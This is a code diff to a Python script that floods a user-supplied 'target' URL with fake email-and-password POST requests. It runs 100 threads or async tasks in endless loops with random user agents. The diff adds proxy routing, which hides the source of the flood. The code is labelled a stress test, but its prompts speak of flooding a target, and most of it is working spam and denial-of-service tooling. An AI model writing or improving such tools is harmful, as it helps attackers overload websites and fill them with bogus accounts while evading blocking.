@@ -30,7 +30,7 @@ def generate_random_email():
 def generate_random_password():
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
 
-async def send_posts_async(url):
+async def send_posts_async(url, proxy):
     while True:
         try:
             email = generate_random_email()
@@ -40,17 +40,16 @@ async def send_posts_async(url):
             user_agent = ua.random
             headers = {'User-Agent': user_agent}
             async with aiohttp.ClientSession() as session:
-                async with session.post(url, data=data, headers=headers) as response:
-                    print(f"Email: {email}, Password: {password}, Status Code: {response.status}, headers: {user_agent}")
+                async with session.post(url, data=data, headers=headers, proxy=proxy) as response:
+                    print(f"Email: {email}, Password: {password}, Status Code: {response.status}, headers: {user_agent}, proxy: {proxy}")
         except Exception as e:
             print(f"An error occurred: {e}")
 
-async def main_async():
-    url = input("Enter the URL of the target you want to flood: ")
-    tasks = [send_posts_async(url) for _ in range(100)]
+async def main_async(url, proxy):
+    tasks = [send_posts_async(url, proxy) for _ in range(100)]
     await asyncio.gather(*tasks)
 
-def send_posts(url):
+def send_posts(url, proxies):
     while True:
         try:
             email = generate_random_email()
@@ -59,13 +58,13 @@ def send_posts(url):
             ua = UserAgent()
             user_agent = ua.random
             headers = {'User-Agent': user_agent}
-            response = requests.post(url, data=data, headers=headers)
-            print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}")
+            response = requests.post(url, data=data, headers=headers, proxies=proxies)
+            print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, headers: {user_agent}, proxy: {proxies}")
         except Exception as e:
             print(f"An error occurred: {e}")
 
-def start_threading(url):
-    threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(100)]
+def start_threading(url, proxies):
+    threads = [threading.Thread(target=send_posts, args=(url, proxies), daemon=True) for _ in range(100)]
     for t in threads:
         t.start()
     for t in threads:
@@ -74,11 +73,14 @@ def start_threading(url):
 def stress_test():
     method = input("Choose the method for stress testing (threading/asyncio): ").strip().lower()
     url = input("Enter the URL of the target you want to flood: ")
+    proxy = input("Enter the proxy (e.g., http://proxyserver:port or leave blank for no proxy): ").strip()
+    
+    proxies = {"http": proxy, "https": proxy} if proxy else None
 
     if method == "asyncio":
-        asyncio.run(main_async())
+        asyncio.run(main_async(url, proxy))
     elif method == "threading":
-        start_threading(url)
+        start_threading(url, proxies)
     else:
         print("Invalid method. Choose either 'threading' or 'asyncio'.")
 
